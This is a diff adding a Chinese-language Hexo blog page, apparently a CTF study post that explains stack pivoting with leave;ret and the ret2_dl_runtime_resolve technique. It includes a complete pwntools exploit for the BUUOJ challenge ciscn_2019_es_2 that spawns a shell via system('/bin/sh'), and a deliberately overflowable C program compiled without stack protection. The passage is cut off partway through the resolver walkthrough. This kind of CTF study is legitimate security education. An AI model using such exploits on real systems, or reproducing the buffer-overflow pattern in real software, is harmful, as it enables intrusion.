@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="wutong">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://wutong01304.github.io/2023/07/13/ret2dlruntime/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="在之前的博客中，我们介绍了延迟绑定机制 。我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的，如果我们可以控制相应的参数及其对应地址内容，就可以控制解析的函数了。 在介绍_dl_runtime_resolve之前，我们先介绍栈迁移 一、栈迁移1.1 介绍我们在进行栈溢出的时候，利用的gadgets往">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移+ret2_dl_runtime_reslove">
+<meta property="og:url" content="https://wutong01304.github.io/2023/07/13/ret2dlruntime/index.html">
+<meta property="og:site_name" content="wutong">
+<meta property="og:description" content="在之前的博客中，我们介绍了延迟绑定机制 。我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的，如果我们可以控制相应的参数及其对应地址内容，就可以控制解析的函数了。 在介绍_dl_runtime_resolve之前，我们先介绍栈迁移 一、栈迁移1.1 介绍我们在进行栈溢出的时候，利用的gadgets往">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le1.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le2.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le3.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le4.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le5.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le6.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le7.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le8.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le10.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le9.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le11.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d1.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d2.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d3.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d4.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d5.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d6.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d7.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d8.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d9.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d10.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d11.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d12.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d13.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d14.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d15.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d16.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d17.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d18.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d19.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d21.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d22.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d23.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d24.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d25.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/dend.png?x-oss-process=style/watermark">
+<meta property="article:published_time" content="2023-07-13T06:05:54.000Z">
+<meta property="article:modified_time" content="2023-07-22T09:43:01.295Z">
+<meta property="article:author" content="wutong">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Stack">
+<meta property="article:tag" content="ret2_dl_runtime_resolve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le1.png?x-oss-process=style/watermark">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            栈迁移+ret2_dl_runtime_reslove -
+        
+        wutong
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"wutong01304.github.io","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":2,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"static","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"梧桐","subtitle":{"text":["梧桐生矣，于彼朝阳"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.1","navbar":{"auto_hide":false,"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"categories":{"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/wutong01304","icon":"github"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/7/1 11:45:14"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                wutong
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://github.com/wutong01304"  >
+                                    
+                                        
+                                            <i class="github"></i>
+                                        
+                                        GITHUB
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        target="_blank" rel="noopener" href="https://github.com/wutong01304"  >
+                             
+                                
+                                    <i class="github"></i>
+                                
+                                GITHUB
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dlruncover.jpg" alt="栈迁移+ret2_dl_runtime_reslove" />
+                    <h1 class="article-title-cover">栈迁移+ret2_dl_runtime_reslove</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">wutong</span>
+                            
+                                <span class="author-label">Lv3</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-07-13 14:05:54</span>
+        <span class="mobile">2023-07-13 14:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-07-22 17:43:01</span>
+            <span class="mobile">2023-07-22 17:43</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Study/">Study</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Stack/">Stack</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2-dl-runtime-resolve/">ret2_dl_runtime_resolve</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p>在之前的博客中，我们介绍了<a href="https://wutong01304.github.io/2023/07/07/ret2libc/">延迟绑定机制</a> 。我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的，如果我们可以控制相应的参数及其对应地址内容，就可以控制解析的函数了。</p>
+<p>在介绍_dl_runtime_resolve之前，我们先介绍栈迁移</p>
+<h1 id="一、栈迁移"><a href="#一、栈迁移" class="headerlink" title="一、栈迁移"></a>一、栈迁移</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>我们在进行栈溢出的时候，利用的gadgets往往比较长，此时会出现栈溢出空间大小不足的问题。而栈迁移就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行返回导向编程（ROP）。</p>
+<p>接下来我们介绍一下利用 leave ret 进行栈迁移到 bss 段的原理。</p>
+<p>leave_ret 在函数返回时本身就会执行（如下）。leave 的作用相当于 mov esp, ebp; pop ebp，ret 的作用是相当于 pop eip</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le1.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>我们值得在调用函数完毕返回后，会执行mov esp ,ebp；pop ebp的操作，因此当我们将leave_ret 填在返回地址后，这个操作相当于会被执行两次。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le2.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>正常情况下执行这个操作</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le3.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>但是如果我们将EBP地址变成我们构造的虚假EBP地址（bss段地址），返回地址填入leave_re，此时第一次执行：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le4.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>然后程序转到leave_ret执行，也就是再执行一次：mov esp ,ebp；pop ebp。此时若bss 段是我们构造好的另一个地址，比如bss+16的话：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le5.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>此时，bss段就被我们构造成了一个虚假的栈，esp和ebp会在这里移动并执行指令，若我们将函数地址写入（比如write）,此时再执行leave_ret的后半段指令（ret：pop eip），就会去执行这个函数。</p>
+<h2 id="1-2-例题"><a href="#1-2-例题" class="headerlink" title="1.2 例题"></a>1.2 例题</h2><p>题目：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2" >https://buuoj.cn/challenges#ciscn_2019_es_2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>使用32位IDA打开，查看关键的函数vul，函数里创建了一个长度为0x28的buf字符串，read函数最大可输入长度为0x30，只可以溢出8个字节，ebp占四个字节，然后就是返回地址4个字节。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le6.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>函数列表里有system函数，但由于我们能溢出的字符串太短，没办法给system函数构造参数，所以使用栈迁移。</p>
+<p>首先我们通过第一次溢出，使程序打印出当前EBP存储的地址。之所以可以打印的原理是，read读入s长度有0x30字节，如果我们输入0x28个字节，read函数就会多读8个字节，也就会将ebp的内容读取进去，而printf函数执行时会将0x30字节的数据都打印，即ebp的内容也会被打印出来。</p>
+<p>首先，我们通过调试查了打印出来的ebp内容 距离当前ebp的偏移：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le7.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>如图所示，我们可以知道 read函数的ebp0 距离 printf函数ebp1 之间为0x10的偏移：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le8.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>然后我们通过第二次溢出，将构造好的system函数输入栈，并将EBP填入我们构造的虚假EBP，将返回地址填入leave_ret进行栈迁移：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le10.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>如上图所示，我们将虚假的EBP指向read函数栈帧开始的地方，也就是leak_addr - 0x10 -0x28，然后再输入构造好的system函数。这样程序执行leave_ret的时候就会回到read栈帧开始的地方，进而去执行system。值得注意的是，由于leve_ret的后半段是pop ebp指令，然后才是pop eip指令，因此我们需要填入四字节垃圾数据，使得它可以正确执行system。</p>
+<p>使用如下执行寻找leave ret进行栈迁移：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_es_2 --only &#x27;leave|ret&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le9.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>完整exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27971</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;bbbbbbbb&#x27;</span> <span class="comment">#输入0x28个字节</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">leak_addr = u32(p.recv(<span class="number">4</span>))<span class="comment">#接收打印出来的ebp地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;0x%x&quot;</span>  %leak_addr</span><br><span class="line">payload2 =(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+<span class="string">&#x27;bbbb&#x27;</span>+p32(leak_addr-<span class="number">0x28</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload2+=p32(leak_addr-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>获取shell成功：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le11.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<h1 id="二、基本原理"><a href="#二、基本原理" class="headerlink" title="二、基本原理"></a>二、基本原理</h1><p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/erh0l7" >Advanced ROP (yuque.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
+<p>_dl_runtime_resolve(link_map_obj, reloc_index)是进行延迟绑定的时候重定位的，在第一次调用函数的时候，它会去寻找函数的真实地址，过程如下：</p>
+<ol>
+<li>首先使用 link_map 访问 .dynamic，分别取出 .dynstr、.dynsym、.rel.plt 的地址</li>
+<li>.rel.plt + 参数 reloc_arg，求出当前函数的重定位表项 Elf32_Rel 的指针，记作 rel</li>
+<li>rel 的 r_info &gt;&gt; 8 作为 .dynsym 的下标，求出当前函数的符号表项 Elf32_Sym 的指针，记作 sym</li>
+<li>.dynstr + sym -&gt; st_name 得出符号名字符串指针</li>
+<li>在动态链接库查找这个函数地址，并且把地址赋值给 *rel -&gt; r_offset，即 GOT 表</li>
+<li>调用这个函数</li>
+</ol>
+<p>接下来，通过一个例子详细了解这个过程：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>使用如下命令进行编译：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main -m32 -fno-stack-protector bof.c</span><br></pre></td></tr></table></figure></div>
+
+<p>然后用gdb进行调试：</p>
+<p>利用strlen函数查看。反汇编找到调用地址：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d1.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>在strlen函数也就是0x80483b0下断点：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d2.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>si单步步入：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d3.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>此时，程序 jmp 到0x804a014，查看指令，发现其跳转的就是下一条指令：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d4.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>继续si单步进入，先进入到全局偏移表，在进入到dl_runtime_resolve。在这之前，程序 push 了两个参数，一个是 0x10，一个是 0x804a004 里面的内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d5.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>查看里面的内容，存了一个地址 0xf7ffd940 ，这个地址就是 <strong>link_map</strong> 的地址。通过这个地址就可以找到 <strong>.dynamic</strong> 的地址，就是第三个 0x8049f14。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d6.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>通过0x8049f14可以找到**.dynstr、 .dynsym、 .rel.plt** 的地址。</p>
+<ul>
+<li>.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x08048278</li>
+<li>.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481d8</li>
+<li>.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048330</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d7.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>.rel.plt 的地址加上参数 reloc_arg，即 0x08048330 + 0x10 -&gt; 0x8048340。找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d8.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>通过这个 rel 可以得到以下信息</p>
+<ul>
+<li>r_offset &#x3D; 0x0804a014（第一个值）   &#x2F;&#x2F;指向GOT表的指针</li>
+<li>r_info &#x3D; 0x00000407（第二个值）</li>
+</ul>
